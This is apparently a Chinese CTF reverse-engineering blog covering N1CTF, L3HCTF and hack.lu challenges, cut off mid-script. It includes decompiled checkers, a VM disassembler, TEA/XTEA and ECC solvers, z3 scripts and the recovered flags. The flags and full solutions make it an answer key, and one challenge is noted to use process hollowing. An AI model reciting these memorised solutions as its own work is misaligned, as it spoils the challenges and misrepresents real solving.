手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换\n通过使用的参数和函数的形式，猜测应该是个ECC算法，对其进行还原（这里只猜到了opcode被替换，但没有想到去哪里查看新的opcode）\n肉眼还原了一下运算：把 \u0026amp; 换成 |， | 换成 \u0026lt;\u0026lt;，\u0026lt;\u0026lt; 换成 ^，^ 换成 +，+ 换成 %，% 换成 -，- 换成 *，** 换成 //，\u0026gt;\u0026gt; 换成 \u0026amp;\n0a5n.py:\nimport L from var import * def check_format(flag): if len(flag) != 28: return False for i in flag: if i not in \u0026#39;0123456789abcdef\u0026#39;: return False return True v1 = L.c1(v1, v2, v3) v6 = L.c2(v1, v4, v5) k = input(\u0026#39;flag:\u0026#39;) if check_format(k) == True: v2 = L.f3(k) v3 = v2 * v6 if v3.a2 == g1 and v3.a3 == g2: print(\u0026#39;Congratulations! n1ctf{%s}\u0026#39; % k) L.py:\ndef inv_mod(b, p): if b \u0026lt; 0 or p \u0026lt;= b: b = b % p c, d = b, p uc, vc, ud, vd, temp = 1, 0, 0, 1, 0 while c != 0: temp = c q, c, d = d // c, d % c, temp uc, vc, ud, vd = ud - q * uc, vd - q * vc, uc, vc assert d == 1 if ud \u0026gt; 0: return ud else: return ud + p def leftmost_bit(x): assert x \u0026gt; 0 result = 1 while result \u0026lt;= x: result = 2 * result return result // 2 class Curve(object): # c1 def __init__(self, p, a, b): var4 = p var4 ^= 0x10000000000000000000000000000000000000000L self.p = var4 var5 = a var5 -= 1 var5 //= 2 self.a = var5 var6 = b var6 //= 2 var6 += 1 self.b = var6 def s1(self, x, y): # 判断是否在曲线上 return (y * y) - (x * x * x + self.a * x + self.b) % self.p == 0 class Point(object): # c2 def __init__(self, curve: Curve, x, y, order=None): self.curve = curve self.x = x self.y = y self.order = order if self.a1: assert self.a1.s1(x, y) if order: assert self * order == g1 def __eq__(self, other): if self.curve == other.curve and self.x == other.x and self.y == other.y: return True else: return False def __add__(self, other): if other == g1: return self if self == g1: return other assert self.curve == other.curve if self.x == other.x: if (self.y + other.y) % self.curve.p == 0: return g1 return self.s1() p = self.curve.p l = other.y % self.y - inv_mod(other.x % self.x, p) + p x3 = (l * l - self.x - other.x) % p y3 = (l * (self.x - x3) - self.y) % p return Point(self.curve, x3, y3) def __mul__(self, other): e = other if self.order: e = e + self.order if e == 0: return g1 if self == g1: return g1 e3 = 3 * e negative_self = Point(self.curve, self.x, -self.y, self.order) i = leftmost_bit(e3) ** 2 result = self while i \u0026gt; 1: result = result.s1() if e3 \u0026amp; i != 0 and e \u0026amp; i == 0: result = result + self if e3 \u0026amp; i == 0 and e \u0026amp; i != 0: result = result + negative_self i = i // 2 return result def __rmul__(self, other): return self * other def s1(self): # double函数 if self == g1: return g1 p = self.curve.p # 曲线的p a = self.curve.a # 曲线的a l = (3 * self.x * self.x + a) * inv_mod(2 * self.y, p) % p # 加法的lambda x3 = (l * l) - (2 * self.x) % p # 加法的x_3 y3 = ((l * (self.x - x3)) - self.y) % p # 加法的y_3 return Point(self.curve, x3, y3) g1 = Point(None, None, None) # g1是INFINITY def f3(var0): var1 = 0 for i in var0[::-1]: var1 = (var1 \u0026lt;\u0026lt; 4) | int(i, 16) return var1 接下来只需要寻找 from var import * 中的 var 即可\n根据pyinstxtractor.py的报错，发现 magic number 和 python3.5 差了1，于是找到报错的位置，将工具对 MAGIC_NUMBER 的检查去掉\nif pyc_magic != pycHeader: print(\u0026#39;[!] Warning: This script is running in a different Python version than the one used to build the executable.\u0026#39;) print(\u0026#39;[!] Please run this script in Python{0}to prevent extraction errors during unmarshalling\u0026#39;.format(self.pyver)) print(\u0026#39;[!] Skipping pyz extraction\u0026#39;) # return 用python3.5进行解包，可以得到 var.pyc.encrypt\n手动解密\nimport zlib import tinyaes key = \u0026#39;nu1lnu1lnu1lnu1l\u0026#39; obj = open(\u0026#39;var.pyc.encrypted\u0026#39;, \u0026#39;rb\u0026#39;).read() cipher = tinyaes.AES(key.encode(), obj[:16]) obj = cipher.CTR_xcrypt_buffer(obj[16:]) obj = zlib.decompress(obj) open(\u0026#39;var.pyc\u0026#39;, \u0026#39;wb\u0026#39;).write(obj) 得到ECC的曲线和点\np = 0xfffffffffffffffffffffffffffffffeffffac73 a = 0xfffffffffffffffffffffffffffffffeffffac71 b = 0x21 Px = 0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e Py = 0xafb7be2af28b649dab76337b42ee310119413529 Qx = 0x4945e0d8dc57e88d5949f84bf09943f572dbebb1 Qy = 0xb1bf040fe1939c7144341d3af61f36d63f47e272 上网抄了个sage实现的Pohlig-Hellman进行求解\np = 0xfffffffffffffffffffffffffffffffeffffac73 a = 0xfffffffffffffffffffffffffffffffeffffac71 b = 0x21 P = (0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e, 0xafb7be2af28b649dab76337b42ee310119413529) Q = (0x4945e0d8dc57e88d5949f84bf09943f572dbebb1, 0xb1bf040fe1939c7144341d3af61f36d63f47e272) F = FiniteField(p) E = EllipticCurve(F, [a, b]) P = E.point(P) Q = E.point(Q) print(factor(P.order())) primes = [2^6, 5, 17, 79, 4457, 40591, 585977563, 1460624777797, 5490618741917] dlogs = [] for fac in primes: t = int(P.order()) // int(fac) dlog = discrete_log(t*Q,t*P, operation=\u0026#34;+\u0026#34;) dlogs += [dlog] print(\u0026#34;factor: \u0026#34;+str(fac)+\u0026#34;, Discrete Log: \u0026#34;+str(dlog)) crt(dlogs, primes) 得到的结果计算十六进制并反转就是最后的flag\n赛后查看了一下官方的WP，发现opcode就在 opcode.pyc 里面，因为一开始没有解包出来 opcode.pyc 所以就没有想到这里\n\u0026#34;\u0026#34;\u0026#34; opcode module - potentially shared between dis and other modules which operate on bytecodes (e.g. peephole optimizers). \u0026#34;\u0026#34;\u0026#34; __all__ = [ \u0026#39;cmp_op\u0026#39;, \u0026#39;hasconst\u0026#39;, \u0026#39;hasname\u0026#39;, \u0026#39;hasjrel\u0026#39;, \u0026#39;hasjabs\u0026#39;, \u0026#39;haslocal\u0026#39;, \u0026#39;hascompare\u0026#39;, \u0026#39;hasfree\u0026#39;, \u0026#39;opname\u0026#39;, \u0026#39;opmap\u0026#39;, \u0026#39;HAVE_ARGUMENT\u0026#39;, \u0026#39;EXTENDED_ARG\u0026#39;, \u0026#39;hasnargs\u0026#39;] try: from _opcode import stack_effect __all__.append(\u0026#39;stack_effect\u0026#39;) except ImportError: pass cmp_op = (\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026lt;=\u0026#39;, \u0026#39;==\u0026#39;, \u0026#39;!=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;=\u0026#39;, \u0026#39;in\u0026#39;, \u0026#39;not in\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;is not\u0026#39;, \u0026#39;exception match\u0026#39;, \u0026#39;BAD\u0026#39;) hasconst = [] hasname = [] hasjrel = [] hasjabs = [] haslocal = [] hascompare = [] hasfree = [] hasnargs = [] opmap = {} opname = [ \u0026#39;\u0026#39;] - 256 # 这里也改了，应该是 * for op in range(256): opname[op] = \u0026#39;\u0026lt;%r\u0026gt;\u0026#39; + (op,) del op def def_op(name, op): opname[op] = name opmap[name] = op def name_op(name, op): def_op(name, op) hasname.append(op) def jrel_op(name, op): def_op(name, op) hasjrel.append(op) def jabs_op(name, op): def_op(name, op) hasjabs.append(op) def_op(\u0026#39;POP_TOP\u0026#39;, 1) def_op(\u0026#39;ROT_TWO\u0026#39;, 2) def_op(\u0026#39;ROT_THREE\u0026#39;, 3) def_op(\u0026#39;DUP_TOP\u0026#39;, 4) def_op(\u0026#39;DUP_TOP_TWO\u0026#39;, 5) def_op(\u0026#39;NOP\u0026#39;, 9) def_op(\u0026#39;UNARY_POSITIVE\u0026#39;, 10) def_op(\u0026#39;UNARY_NEGATIVE\u0026#39;, 11) def_op(\u0026#39;UNARY_NOT\u0026#39;, 12) def_op(\u0026#39;UNARY_INVERT\u0026#39;, 15) def_op(\u0026#39;BINARY_MATRIX_MULTIPLY\u0026#39;, 16) def_op(\u0026#39;INPLACE_MATRIX_MULTIPLY\u0026#39;, 17) def_op(\u0026#39;BINARY_POWER\u0026#39;, 26) #define BINARY_FLOOR_DIVIDE 26 def_op(\u0026#39;BINARY_MULTIPLY\u0026#39;, 24) #define BINARY_SUBTRACT 24 def_op(\u0026#39;BINARY_MODULO\u0026#39;, 23) #define BINARY_ADD 23 def_op(\u0026#39;BINARY_ADD\u0026#39;, 65) #define BINARY_XOR 65 def_op(\u0026#39;BINARY_SUBTRACT\u0026#39;, 22) #define BINARY_MODULO 22 def_op(\u0026#39;BINARY_SUBSCR\u0026#39;, 25) def_op(\u0026#39;BINARY_FLOOR_DIVIDE\u0026#39;, 19) #define BINARY_POWER 19 def_op(\u0026#39;BINARY_TRUE_DIVIDE\u0026#39;, 20) #define BINARY_MULTIPLY 20 def_op(\u0026#39;INPLACE_FLOOR_DIVIDE\u0026#39;, 28) def_op(\u0026#39;INPLACE_TRUE_DIVIDE\u0026#39;, 29) def_op(\u0026#39;GET_AITER\u0026#39;, 50) def_op(\u0026#39;GET_ANEXT\u0026#39;, 51) def_op(\u0026#39;BEFORE_ASYNC_WITH\u0026#39;, 52) def_op(\u0026#39;INPLACE_ADD\u0026#39;, 55) def_op(\u0026#39;INPLACE_SUBTRACT\u0026#39;, 56) def_op(\u0026#39;INPLACE_MULTIPLY\u0026#39;, 57) def_op(\u0026#39;INPLACE_MODULO\u0026#39;, 59) def_op(\u0026#39;STORE_SUBSCR\u0026#39;, 60) def_op(\u0026#39;DELETE_SUBSCR\u0026#39;, 61) def_op(\u0026#39;BINARY_LSHIFT\u0026#39;, 66) #define BINARY_OR 66 def_op(\u0026#39;BINARY_RSHIFT\u0026#39;, 27) #define BINARY_TRUE_DIVIDE 27 def_op(\u0026#39;BINARY_AND\u0026#39;, 63) #define BINARY_RSHIFT 63 def_op(\u0026#39;BINARY_XOR\u0026#39;, 62) #define BINARY_LSHIFT 62 def_op(\u0026#39;BINARY_OR\u0026#39;, 64) #define BINARY_AND 64 def_op(\u0026#39;INPLACE_POWER\u0026#39;, 67) def_op(\u0026#39;GET_ITER\u0026#39;, 68) def_op(\u0026#39;GET_YIELD_FROM_ITER\u0026#39;, 69) def_op(\u0026#39;PRINT_EXPR\u0026#39;, 70) def_op(\u0026#39;LOAD_BUILD_CLASS\u0026#39;, 71) def_op(\u0026#39;YIELD_FROM\u0026#39;, 72) def_op(\u0026#39;GET_AWAITABLE\u0026#39;, 73) def_op(\u0026#39;INPLACE_LSHIFT\u0026#39;, 75) def_op(\u0026#39;INPLACE_RSHIFT\u0026#39;, 76) def_op(\u0026#39;INPLACE_AND\u0026#39;, 77) def_op(\u0026#39;INPLACE_XOR\u0026#39;, 78) def_op(\u0026#39;INPLACE_OR\u0026#39;, 79) def_op(\u0026#39;BREAK_LOOP\u0026#39;, 80) def_op(\u0026#39;WITH_CLEANUP_START\u0026#39;, 81) def_op(\u0026#39;WITH_CLEANUP_FINISH\u0026#39;, 82) def_op(\u0026#39;RETURN_VALUE\u0026#39;, 83) def_op(\u0026#39;IMPORT_STAR\u0026#39;, 84) def_op(\u0026#39;YIELD_VALUE\u0026#39;, 86) def_op(\u0026#39;POP_BLOCK\u0026#39;, 87) def_op(\u0026#39;END_FINALLY\u0026#39;, 88) def_op(\u0026#39;POP_EXCEPT\u0026#39;, 89) HAVE_ARGUMENT = 90 name_op(\u0026#39;STORE_NAME\u0026#39;, 90) name_op(\u0026#39;DELETE_NAME\u0026#39;, 91) def_op(\u0026#39;UNPACK_SEQUENCE\u0026#39;, 92) jrel_op(\u0026#39;FOR_ITER\u0026#39;, 93) def_op(\u0026#39;UNPACK_EX\u0026#39;, 94) name_op(\u0026#39;STORE_ATTR\u0026#39;, 95) name_op(\u0026#39;DELETE_ATTR\u0026#39;, 96) name_op(\u0026#39;STORE_GLOBAL\u0026#39;, 97) name_op(\u0026#39;DELETE_GLOBAL\u0026#39;, 98) def_op(\u0026#39;LOAD_CONST\u0026#39;, 100) hasconst.append(100) name_op(\u0026#39;LOAD_NAME\u0026#39;, 101) def_op(\u0026#39;BUILD_TUPLE\u0026#39;, 102) def_op(\u0026#39;BUILD_LIST\u0026#39;, 103) def_op(\u0026#39;BUILD_SET\u0026#39;, 104) def_op(\u0026#39;BUILD_MAP\u0026#39;, 105) name_op(\u0026#39;LOAD_ATTR\u0026#39;, 106) def_op(\u0026#39;COMPARE_OP\u0026#39;, 107) hascompare.append(107) name_op(\u0026#39;IMPORT_NAME\u0026#39;, 108) name_op(\u0026#39;IMPORT_FROM\u0026#39;, 109) jrel_op(\u0026#39;JUMP_FORWARD\u0026#39;, 110) jabs_op(\u0026#39;JUMP_IF_FALSE_OR_POP\u0026#39;, 112) jabs_op(\u0026#39;JUMP_IF_TRUE_OR_POP\u0026#39;, 111) jabs_op(\u0026#39;JUMP_ABSOLUTE\u0026#39;, 113) jabs_op(\u0026#39;POP_JUMP_IF_FALSE\u0026#39;, 114) jabs_op(\u0026#39;POP_JUMP_IF_TRUE\u0026#39;, 115) name_op(\u0026#39;LOAD_GLOBAL\u0026#39;, 116) jabs_op(\u0026#39;CONTINUE_LOOP\u0026#39;, 119) jrel_op(\u0026#39;SETUP_LOOP\u0026#39;, 120) jrel_op(\u0026#39;SETUP_EXCEPT\u0026#39;, 121) jrel_op(\u0026#39;SETUP_FINALLY\u0026#39;, 122) def_op(\u0026#39;LOAD_FAST\u0026#39;, 124) haslocal.append(124) def_op(\u0026#39;STORE_FAST\u0026#39;, 125) haslocal.append(125) def_op(\u0026#39;DELETE_FAST\u0026#39;, 126) haslocal.append(126) def_op(\u0026#39;RAISE_VARARGS\u0026#39;, 130) def_op(\u0026#39;CALL_FUNCTION\u0026#39;, 131) hasnargs.append(131) def_op(\u0026#39;MAKE_FUNCTION\u0026#39;, 132) def_op(\u0026#39;BUILD_SLICE\u0026#39;, 133) def_op(\u0026#39;MAKE_CLOSURE\u0026#39;, 134) def_op(\u0026#39;LOAD_CLOSURE\u0026#39;, 135) hasfree.append(135) def_op(\u0026#39;LOAD_DEREF\u0026#39;, 136) hasfree.append(136) def_op(\u0026#39;STORE_DEREF\u0026#39;, 137) hasfree.append(137) def_op(\u0026#39;DELETE_DEREF\u0026#39;, 138) hasfree.append(138) def_op(\u0026#39;CALL_FUNCTION_VAR\u0026#39;, 140) hasnargs.append(140) def_op(\u0026#39;CALL_FUNCTION_KW\u0026#39;, 141) hasnargs.append(141) def_op(\u0026#39;CALL_FUNCTION_VAR_KW\u0026#39;, 142) hasnargs.append(142) jrel_op(\u0026#39;SETUP_WITH\u0026#39;, 143) def_op(\u0026#39;LIST_APPEND\u0026#39;, 145) def_op(\u0026#39;SET_ADD\u0026#39;, 146) def_op(\u0026#39;MAP_ADD\u0026#39;, 147) def_op(\u0026#39;LOAD_CLASSDEREF\u0026#39;, 148) hasfree.append(148) jrel_op(\u0026#39;SETUP_ASYNC_WITH\u0026#39;, 154) def_op(\u0026#39;EXTENDED_ARG\u0026#39;, 144) EXTENDED_ARG = 144 def_op(\u0026#39;BUILD_LIST_UNPACK\u0026#39;, 149) def_op(\u0026#39;BUILD_MAP_UNPACK\u0026#39;, 150) def_op(\u0026#39;BUILD_MAP_UNPACK_WITH_CALL\u0026#39;, 151) def_op(\u0026#39;BUILD_TUPLE_UNPACK\u0026#39;, 152) def_op(\u0026#39;BUILD_SET_UNPACK\u0026#39;, 153) del def_op del name_op del jrel_op del jabs_op 这下就很舒服了（如果全都改乱了，就得写个脚本全改回去了，不过这样的话这个程序是不是也看不懂了）\n[L3HCTF 2021]double-joy 恢复jmp表，发现是个vm，写一下反汇编\nopcode = [] i = 0 index = 0 while i \u0026lt; len_op: if i \u0026gt; 590: break cur_op = opcode[i] if cur_op == 0: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] += memory[{index}]\u0026#34;) i += 1 elif cur_op == 1: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] = memory[{index}] - memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 2: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] *= memory[{index}]\u0026#34;) i += 1 elif cur_op == 3: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] = memory[{index}] / memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 4: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] %= memory[{index}] % memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 5: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] \u0026amp;= memory[{index}]\u0026#34;) i += 1 elif cur_op == 6: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] |= memory[{index}]\u0026#34;) i += 1 elif cur_op == 7: index = index - 1 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index-1}] ^= memory[{index}]\u0026#34;) i += 1 elif cur_op == 8: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[memory[{index-2}]] = memory[{index-1}]\u0026#34;) # print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;index -= 2\u0026#34;) index = index - 2 i += 1 elif cur_op == 9: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = memory[memory[{index - 1}]]\u0026#34;) i += 1 elif cur_op == 10: #和case 11的情况一样 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = (1 if memory[{index - 1}] == 0 else 0)\u0026#34;) i += 1 elif cur_op == 11: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}] = (1 if memory[{index - 1}] \u0026lt; 0 else 0)\u0026#34;) i += 1 elif cur_op == 12: #这个再仔细看看，不确定性有点高，脑袋有点糊 print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index - 1}], memory[{index - 2}] = memory[{index - 2}], memory[{index - 1}]\u0026#34;) i += 1 elif cur_op == 13: print(\u0026#34;%04x: \u0026#34; % i, \u0026#34;index -= 1 # index = {index}\u0026#34;) index -= 1 i += 1 elif cur_op == 14: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;memory[{index}] = {int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}\u0026#34;) # print (\u0026#34;%04x: \u0026#34; % i, \u0026#34;i += 5\u0026#34;) index += 1 i += 5 elif cur_op == 15: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;i = {hex((int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) + i + 5) \u0026amp; 0xffffffff)}\u0026#34;) # i = int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) + i + 5 i += 5 elif cur_op == 16: print (\u0026#34;%04x: \u0026#34; % i, f\u0026#34;i += 5 + ({int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}if memory[{index - 1}] != 0 else 0)\u0026#34;) index = index - 1 i += 5 elif cur_op == 17: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;index += {int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}\u0026#34;) # print(\u0026#34;%04x i += 5\u0026#34; % i) index += int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False) i += 5 elif cur_op == 18: print(\u0026#34;%04x: \u0026#34; % i, f\u0026#34;return (memory[{int.from_bytes(opcode[i + 1: i + 5], \u0026#39;little\u0026#39;, signed=False)}])\u0026#34;) i += 5 else: print (\u0026#34;Error @ %04x\u0026#34; % i) 动调发现，总共有两个vm，flag的内存被共享，其他的状态分别保留，两个vm依次执行（能看到中间某个循环末尾有个return）分别是xtea加密和tea加密，相当于同时进行xtea和tea加密了写个求解脚本\n需要注意是程序中为int类型，运算需要和题目中的一致（不能用位运算）\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void decipher(int32_t* v) { unsigned int i; int const xtea_k[4] = {18764, 28534, 25888, 17237}; int v0, v1, xtea_delta=123456789, xtea_sum=987654321 + xtea_delta * 100; int tea_k[4] = {21332, 20301, 8308, 25953}; int tea_delta=22334455; /* a key schedule constant */ int tea_sum=1592647341 + tea_delta * 100; /* set up */ for (int j = 8; j \u0026gt;= 0; j -= 2){ v0 = v[j]; v1 = v[j + 1]; for (i = 0; i \u0026lt; 20; i++) { v1 -= ((v0\u0026lt;\u0026lt;4) + tea_k[2]) ^ (v0 + tea_sum) ^ ((v0 / 32) + tea_k[3]); v0 -= ((v1\u0026lt;\u0026lt;4) + tea_k[0]) ^ (v1 + tea_sum) ^ ((v1 / 32) + tea_k[1]); tea_sum -= tea_delta; if (i == 19 \u0026amp;\u0026amp; j == 0){ v0 ^= 0x1010101; v1 ^= 0x1010101; } v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 / 32)) + v0) ^ (xtea_sum + xtea_k[(xtea_sum / 2048) \u0026amp; 3]); xtea_sum -= xtea_delta; v0 -= (((v1 *16 ) ^ (v1 / 32)) + v1) ^ (xtea_sum + xtea_k[xtea_sum \u0026amp; 3]); if (i == 19 \u0026amp;\u0026amp; j == 0){ v0 ^= 0x1010101; v1 ^= 0x1010101; } } /* end cycle */ v[j]=v0; v[j + 1]=v1; } } int main(){ int v[10] = {0xAEE0FAE8, 0xFC3E4101, 0x167CAD92, 0x51EA6CBE, 0x242A0100, 0x1511A1B, 0x514D6694, 0x2F5FBFEB, 0x46D36398, 0x79EEE3F0}; decipher(v); for (int i = 0; i \u0026lt; 10; i+=2) printf(\u0026#34;%x %x\\n\u0026#34;,v[i],v[i + 1]); return 0; } // [0x6c427530, 0x4d765f65, 0x7431575f, 0x4f645f68, 0x65496275, 0x4145545f, 0x7d] // L3HCTF{D0uBle_vM_W1th_dOubIe_TEA} // 第一组失败了，猜测是flag头和D [L3HCTF 2021]Load 这题使用了进程镂空技术（找时间研究室一下这一系列的技术），需要先把PE文件提取出来\n动调进入镂空的函数，会发现一个对PE的比较，网上找可以找到MZ头（name字符串下面），dump下来即可\n分析PE\n首先提取了flag的中间部分，随后将其两两一组转化成16进制，共13字节\n\r\n401070函数是将13字节拆成9和4字节分别存入src和v27，分别是33和22的矩阵\n401370函数较大，且调用了一个递归函数\nv11 = mul_matrix_4012A0(v17, v6) * a1[v5]; if ( (v5 \u0026amp; 1) != 0 ) v4 -= v11; else v4 += v11; 分析发现函数计算递归后与第一行的一个数字相乘，并根据奇偶进行加法和减法，重写该函数并验证后发现是求解矩阵行列式\n再分析401370函数时发现，函数使用了一个数字除以行列式，猜测是用来求解逆矩阵的\n调用完401370后就是验证部分，只需要满足所有等式即可\n使用在线网站求解逆矩阵\n\r\n\r\nflag = [-8, 18, -9, 6, -13, 6, -1, 2, -1, 13, -3, -30, 7] for f in flag: print (\u0026#39;%02x\u0026#39; % (f \u0026amp; 0xff), end=\u0026#39;\u0026#39;) # f812f706f306ff02ff0dfde207 [hack.lu]pycoin 先使用uncompyle6反编译，发现执行了一串marshal字节码\n将该字节码输出到文件，然后根据题目给的pyc补全文件头\n再次反编译发现有花指令，开头和中间各有一个 jump_forward，中间还有两个连续的 rot_tow\n这里尝试了一下新的patch方法：将花指令全替换成nop，但该方法的问题在于只能使用pycdc进行反编译，并不支持uncompyle6\n 个人感觉uncompyle6反编译效果更好，但适用的版本范围更窄，3.7及之前的版本较为合适 pycdc一直更新最新版本，但反编译效果较差，而且在细节上容易出问题，新版本只能使用pycdc，但最好结合pycdas的结果进行分析\n 另一种传统的patch方法就行把opcode去掉，然后把所有jmp修改到正确位置\npatch后的结果如下：\n\r\n\r\n最后反编译的结果为\nfrom hashlib import md5 k = str(input(\u0026#39;please supply a valid key:\u0026#39;)).encode() correct = len(k) == 16 and k[0] == 102 and k[1] == k[0] + 6 and k[2] == k[1] - k[0] + 91 and k[3] == 103 and k[4] == k[11] * 3 - 42 and k[5] == sum(k) - 1322 and k[6] + k[7] + k[10] == 260 and int(chr(k[7]) * 2) + 1 == k[9] and k[8] % 17 == 16 and k[9] == k[8] * 2 and md5(k[10] * b\u0026#39;a\u0026#39;).digest()[0] - 1 == k[3] and k[11] == 55 and k[12] == k[14] / 2 - 2 and k[13] == k[10] * k[8] % 32 * 2 - 1 and k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23 and k[15] == 125 print(f\u0026#34;valid key! {k.decode()}\u0026#34; if correct else \u0026#39;invalid key :(\u0026#39;) 然后一个z3就完事（tm k[5]约束了个寂寞）\nfrom z3 import * s = Solver() k = [BitVec(\u0026#39;k%d\u0026#39; % i, 8) for i in range(16)] s.add(k[0] == 102) s.add(k[1] == k[0] + 6) s.add(k[2] == (k[1] - k[0]) + 91) s.add(k[3] == 103) s.add(k[4] == k[11] * 3 - 42) s.add(k[11] == 55) s.add(k[10] == 101) s.add(k[15] == 125) s.add(k[5] == sum(k) - 1322) s.add(k[6] + k[7] + k[10] == 260) s.add(k[7] \u0026gt; 0x30) s.add(k[7] \u0026lt; 0x40) s.add((k[7] - 0x30) * 11 + 1 == k[9]) s.add(k[8] % 17 == 16) s.add(k[9] == k[8] * 2) s.add(k[12] == k[14] / 2 - 2) s.add(k[13] == (k[10] * k[8] % 32) * 2 - 1) s.add(k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23) if s.check(): model = s.model() for i in range(16): if i == 5: # 这个位置根本没有约束，最后官方直接给出来了 continue print (chr(model[k[i]].as_long()), end=\u0026#39;\u0026#39;) else: print (\u0026#34;No result\u0026#34;) [hack.lu]atareee atareee.atstate2 是内存状态，对其进行binwalk，可以得到 memory.bin 和 savestate.json 文件\n根据分析可以得知是 6052 架构，用Ghidra打开，根据题目中提示的 @061A 找到验证逻辑的地址\n\r\n加密函数和验证函数如下：\nvoid FUN_529e(void) { byte bVar1; byte bVar2; byte bVar3; byte in_C; bVar3 = 0; do { write_1(PORTA,bVar3); bVar1 = read_1(PORTA); if ((bVar1 \u0026amp; 1) == 0) { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_50c2[bVar3] ^ BYTE_ARRAY_50c2[(byte)(bVar3 + 1)]; bVar2 = read_1(PORTA); BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_5234[bVar3]; bVar1 = BYTE_ARRAY_5234[bVar3]; BYTE_ARRAY_5234[bVar3] = bVar1 \u0026lt;\u0026lt; 1 | CARRY1(bVar2,BYTE_ARRAY_50c2[bVar3]); } else { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_50c2[bVar3] ^ BYTE_ARRAY_5219[(byte)(bVar3 - 1) + 1]; bVar1 = BYTE_ARRAY_5234[bVar3]; BYTE_ARRAY_5234[bVar3] = bVar1 \u0026lt;\u0026lt; 1 | in_C; } if ((bool)(bVar1 \u0026gt;\u0026gt; 7)) { BYTE_ARRAY_5234[bVar3] = BYTE_ARRAY_5234[bVar3] + \u0026#39;\\x01\u0026#39;; } bVar3 = bVar3 + 1; in_C = 0x19 \u0026lt; bVar3; } while (bVar3 != 0x1a); return; } undefined FUN_52e8(void) { byte bVar1; bVar1 = 0; do { if (BYTE_ARRAY_5200[bVar1] != BYTE_ARRAY_5234[bVar1]) { FUN_531d(); bVar1 = 0; do { BYTE_ARRAY_509a[bVar1] = s__NICE_TRY,_MAYBE_NEXT_TIME_ITS_C_5276[bVar1]; bVar1 = bVar1 + 1; } while (bVar1 != 0x28); return 0; } bVar1 = bVar1 + 1; } while (bVar1 != 0x1a); bVar1 = 0; do { BYTE_ARRAY_509a[bVar1] = s__GOOD_JOB!_ENJOY_THOSE_REVERSING_524e[bVar1]; bVar1 = bVar1 + 1; } while (bVar1 != 0x28); return 0; } 通过修改 savestate.json 的PC位置（EIP）即可进行动调，发现输入被存入 50c2 中，复现该函数并爆破即可得到flag\ntarget = [ 0x14, 0x1E, 0xC, 0xE0, 0x30, 0x5C, 0xCE, 0xF0, 0x36, 0xAE, 0xFC, 0x39, 0x1A, 0x91, 0xCE, 0xB4, 0xC4, 0xE, 0x18, 0xF3, 0xC8, 0x8E, 0xA, 0x85, 0xF6, 0xbd ] array_50c2 = [ 0xD9, 0x50, 0x48, 0xB9, 0xD8, 0x50, 0x48, 0x60, 0x46, 0x54, 0x43, 0x44, 0x45, 0x49, 0x50, 0x55, 0x52, 0x53, 0x4C, 0x47, 0x58, 0x51, 0xF3, 0x50, 0x8, 0x51, 0x10 ] array_5219 = [ 0xBD, 0x43, 0x11, 0x37, 0xF2, 0x69, 0xAB, 0x2C, 0x99, 0x13, 0x12, 0xD1, 0x7E, 0x9A, 0x8F, 0xE, 0x92, 0x37, 0xF4, 0xAA, 0x4D, 0x77, 0x3, 0x89, 0xCA, 0xFF, ] array_5234 = [0 for _ in range(0x1a)] in_C = 0 j = 0 for i in range(0x19, -1, -1): in_C = 1 if (0x19 \u0026lt; i + 1) else 0 for j in range(0x30, 0x60): array_50c2[i] = j var1 = i var2 = 0 if var1 \u0026amp; 1 == 0: array_5234[i] = array_50c2[i] ^ array_50c2[i + 1] var2 = i var1 = array_5234[i] array_5234[i] = ((var1 \u0026lt;\u0026lt; 1) | ((array_50c2[i] + i) \u0026gt;\u0026gt; 7)) \u0026amp; 0xff else: array_5234[i] = array_50c2[i] ^ array_5219[i] var1 = array_5234[i] array_5234[i] = ((var1 \u0026lt;\u0026lt; 1) | in_C) \u0026amp; 0xff if var1 